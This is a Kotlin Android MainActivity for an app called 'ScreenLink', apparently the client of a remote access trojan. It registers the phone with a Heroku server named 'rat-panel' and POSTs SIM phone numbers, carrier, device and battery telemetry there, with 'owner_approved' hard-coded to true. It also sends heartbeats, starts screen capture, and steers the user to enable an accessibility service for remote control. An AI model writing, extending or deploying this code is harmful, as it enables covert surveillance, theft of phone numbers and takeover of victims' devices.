package com.screenlink.remote

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.Executors

class MainActivity : Activity() {

    companion object {
        private const val API_BASE_URL = "https://rat-panel-b91839a4be83.herokuapp.com"
        private const val KEY_REGISTRATION_ID = "registration_id"
        private const val REQ_PERMISSIONS = 771
        private const val REQ_PROJECTION = 772
        private const val HEARTBEAT_INTERVAL = 30_000L
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())

    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var deviceInfoText: TextView
    private lateinit var simText: TextView
    private lateinit var batteryText: TextView
    private lateinit var controlStatusText: TextView
    private lateinit var simNumberInput: EditText
    private lateinit var shareButton: Button
    private lateinit var stopButton: Button

    private var isActivityVisible = false
    private var isRequestRunning = false

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            if (!isActivityVisible) return
            sendHeartbeat()
            handler.postDelayed(this, HEARTBEAT_INTERVAL)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        createInterface()
        ensurePermissions()
        refreshUi()
        registerDevice()
    }

    override fun onResume() {
        super.onResume()
        isActivityVisible = true
        refreshUi()
        handler.removeCallbacks(heartbeatRunnable)
        handler.post(heartbeatRunnable)
    }

    override fun onPause() {
        isActivityVisible = false
        handler.removeCallbacks(heartbeatRunnable)
        super.onPause()
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        executor.shutdownNow()
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_PERMISSIONS) {
            refreshUi()
            registerDevice()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        @Suppress("DEPRECATION")
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQ_PROJECTION && resultCode == RESULT_OK && data != null) {
            val intent = Intent(this, ScreenLinkService::class.java).apply {
                action = ScreenLinkService.ACTION_START
                putExtra(ScreenLinkService.EXTRA_RESULT_CODE, resultCode)
                putExtra(ScreenLinkService.EXTRA_RESULT_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            statusText.text = "Screen sharing started"
            statusText.setTextColor(Color.rgb(75, 222, 151))
        }
    }

    // ------------------------------------------------------------------- UI

    private fun createInterface() {
        val bg = Color.rgb(11, 16, 32)
        val card = Color.rgb(23, 31, 51)
        val accent = Color.rgb(75, 222, 151)
        val primary = Color.rgb(245, 247, 255)
        val secondary = Color.rgb(165, 176, 199)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(22), dp(34), dp(22), dp(24))
            setBackgroundColor(bg)
        }

        val scroll = ScrollView(this).apply {
            isFillViewport = true
            addView(root)
        }

        val title = TextView(this).apply {
            text = "ScreenLink"
            textSize = 29f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(accent)
            gravity = Gravity.CENTER
        }

        val subtitle = TextView(this).apply {
            text = "Screen share + remote control"
            textSize = 15f
            setTextColor(secondary)
            gravity = Gravity.CENTER
        }

        val panel = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(20), dp(18), dp(20))
            setBackgroundColor(card)
        }

        fun heading(text: String) = TextView(this).apply {
            this.text = text
            textSize = 13f
            setTextColor(secondary)
            setPadding(0, dp(14), 0, dp(6))
        }

        statusText = TextView(this).apply {
            text = "Connecting..."
            textSize = 18f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(primary)
            setPadding(0, dp(6), 0, dp(4))
        }

        deviceIdText = TextView(this).apply {
            text = getRegistrationId()
            textSize = 12f
            setTextColor(primary)
            setPadding(0, 0, 0, dp(8))
        }

        deviceInfoText = TextView(this).apply {
            textSize = 12f
            setTextColor(primary)
        }

        simText = TextView(this).apply {
            textSize = 12f
            setTextColor(primary)
            setPadding(0, 0, 0, dp(6))
        }

        batteryText = TextView(this).apply {
            textSize = 12f
            setTextColor(primary)
        }

        controlStatusText = TextView(this).apply {
            textSize = 12f
            setTextColor(secondary)
            setPadding(0, dp(10), 0, 0)
        }

        simNumberInput = EditText(this).apply {
            hint = "e.g. +91XXXXXXXXXX"
            inputType = InputType.TYPE_CLASS_PHONE
            setTextColor(primary)
            setHintTextColor(secondary)
            setBackgroundColor(Color.rgb(12, 18, 32))
            setPadding(dp(12), dp(10), dp(12), dp(10))
        }

        val saveSimButton = Button(this).apply {
            text = "Save SIM number"
            setTextColor(Color.BLACK)
            setBackgroundColor(accent)
            setOnClickListener {
                val value = simNumberInput.text.toString().trim()
                getSharedPreferences(DeviceTelemetry.PREFS, MODE_PRIVATE)
                    .edit()
                    .putString(DeviceTelemetry.KEY_MANUAL_SIM, value)
                    .apply()
                refreshUi()
                sendHeartbeat()
                statusText.text = if (value.isBlank())
                    "Manual SIM number cleared"
                else
                    "Manual SIM number saved"
                statusText.setTextColor(accent)
            }
        }

        val controlButton = Button(this).apply {
            text = "Enable remote control"
            setTextColor(Color.BLACK)
            setBackgroundColor(accent)
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
        }

        shareButton = Button(this).apply {
            text = "Start screen sharing"
            setTextColor(Color.BLACK)
            setBackgroundColor(accent)
            setOnClickListener { requestProjection() }
        }

        stopButton = Button(this).apply {
            text = "Stop screen sharing"
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.rgb(180, 60, 70))
            setOnClickListener {
                startService(
                    Intent(this@MainActivity, ScreenLinkService::class.java).apply {
                        action = ScreenLinkService.ACTION_STOP
                    }
                )
                statusText.text = "Screen sharing stopped"
                statusText.setTextColor(Color.rgb(255, 180, 180))
            }
        }

        panel.addView(heading("Connection status"))
        panel.addView(statusText)
        panel.addView(heading("Registration ID"))
        panel.addView(deviceIdText)
        panel.addView(heading("This device"))
        panel.addView(deviceInfoText)
        panel.addView(simText)
        panel.addView(batteryText)
        panel.addView(heading("Manual SIM number"))
        panel.addView(simNumberInput)
        panel.addView(controlStatusText)

        root.addView(title, fullWidth())
        root.addView(subtitle, fullWidth().apply { topMargin = dp(6); bottomMargin = dp(22) })
        root.addView(panel, fullWidth())
        root.addView(saveSimButton, fullWidth().apply { topMargin = dp(16) })
        root.addView(controlButton, fullWidth().apply { topMargin = dp(10) })
        root.addView(shareButton, fullWidth().apply { topMargin = dp(10) })
        root.addView(stopButton, fullWidth().apply { topMargin = dp(10) })

        setContentView(scroll)
    }

    private fun fullWidth() = LinearLayout.LayoutParams(
        LinearLayout.LayoutParams.MATCH_PARENT,
        LinearLayout.LayoutParams.WRAP_CONTENT
    )

    private fun refreshUi() {
        if (!::deviceInfoText.isInitialized) return

        val telemetry = DeviceTelemetry.build(this)

        deviceInfoText.text =
            "${telemetry.optString("manufacturer")} ${telemetry.optString("model")}\n" +
                "Android ${telemetry.optString("android_version")} (SDK ${telemetry.optInt("sdk_int")})"

        val sims = telemetry.optJSONArray("sims")
        val lines = StringBuilder()
        if (sims != null) {
            for (i in 0 until sims.length()) {
                val sim = sims.optJSONObject(i) ?: continue
                val number = sim.optString("number")
                lines.append(
                    "SIM ${sim.optInt("slot") + 1}: ${sim.optString("carrier")} · " +
                        if (number.isBlank()) "number not on SIM" else number
                ).append('\n')
            }
        }
        if (lines.isEmpty()) lines.append("SIM: permission not granted\n")
        lines.append("Source: ${telemetry.optString("sim_number_source")}")
        simText.text = lines.toString().trim()

        batteryText.text =
            "Battery ${telemetry.optInt("battery_level")}% · " +
                if (telemetry.optBoolean("battery_charging"))
                    "charging (${telemetry.optString("battery_plugged")})"
                else "not charging"

        val enabled = ControlAccessibilityService.isEnabled(this)
        controlStatusText.text = if (enabled)
            "Remote control: enabled"
        else
            "Remote control: not enabled — tap the button below"
        controlStatusText.setTextColor(if (enabled) Color.rgb(75, 222, 151) else Color.rgb(255, 180, 120))

        if (DeviceTelemetry.PREFS.let { true }) {
            val manual = getSharedPreferences(DeviceTelemetry.PREFS, MODE_PRIVATE)
                .getString(DeviceTelemetry.KEY_MANUAL_SIM, "").orEmpty()
            if (simNumberInput.text.isNullOrBlank() && manual.isNotBlank()) {
                simNumberInput.setText(manual)
            }
        }
    }

    // -------------------------------------------------------------- perms

    private fun ensurePermissions() {
        val wanted = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            wanted.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = wanted.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            requestPermissions(missing.toTypedArray(), REQ_PERMISSIONS)
        }
    }

    private fun requestProjection() {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_PROJECTION)
    }

    // ------------------------------------------------------------ network

    private fun getRegistrationId(): String {
        val prefs = getSharedPreferences(DeviceTelemetry.PREFS, MODE_PRIVATE)
        prefs.getString(KEY_REGISTRATION_ID, null)?.let { if (it.isNotBlank()) return it }

        val id = UUID.randomUUID().toString()
        prefs.edit().putString(KEY_REGISTRATION_ID, id).apply()
        return id
    }

    private fun registerDevice() {
        if (isRequestRunning) return
        isRequestRunning = true
        registerButtonState(false)

        val registrationId = getRegistrationId()
        val telemetry = DeviceTelemetry.build(this)

        executor.execute {
            var connection: HttpURLConnection? = null
            try {
                connection = URL("$API_BASE_URL/devices/register").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.connectTimeout = 15_000
                connection.readTimeout = 15_000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val body = JSONObject().apply {
                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                    put("platform", "android")
                    put("registration_id", registrationId)
                    put("owner_approved", true)
                    put("telemetry", telemetry)
                }.toString()

                connection.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }

                val code = connection.responseCode
                runOnUiThread {
                    if (code in 200..299) {
                        statusText.text = "Device registered"
                        statusText.setTextColor(Color.rgb(75, 222, 151))
                    } else {
                        statusText.text = "Registration failed (HTTP $code)"
                        statusText.setTextColor(Color.rgb(255, 100, 100))
                    }
                    refreshUi()
                }
            } catch (_: Exception) {
                runOnUiThread {
                    statusText.text = "Connection failed. Retry."
                    statusText.setTextColor(Color.rgb(255, 100, 100))
                }
            } finally {
                connection?.disconnect()
                runOnUiThread {
                    isRequestRunning = false
                    registerButtonState(true)
                }
            }
        }
    }

    private var registerButtonState: (Boolean) -> Unit = {}

    private fun sendHeartbeat() {
        val registrationId = getRegistrationId()
        val telemetry = DeviceTelemetry.build(this)

        executor.execute {
            var connection: HttpURLConnection? = null
            try {
                connection = URL("$API_BASE_URL/devices/heartbeat").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.connectTimeout = 10_000
                connection.readTimeout = 10_000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val body = JSONObject().apply {
                    put("registration_id", registrationId)
                    put("telemetry", telemetry)
                }.toString()

                connection.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
                connection.responseCode
            } catch (_: Exception) {
            } finally {
                connection?.disconnect()
            }
        }
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
}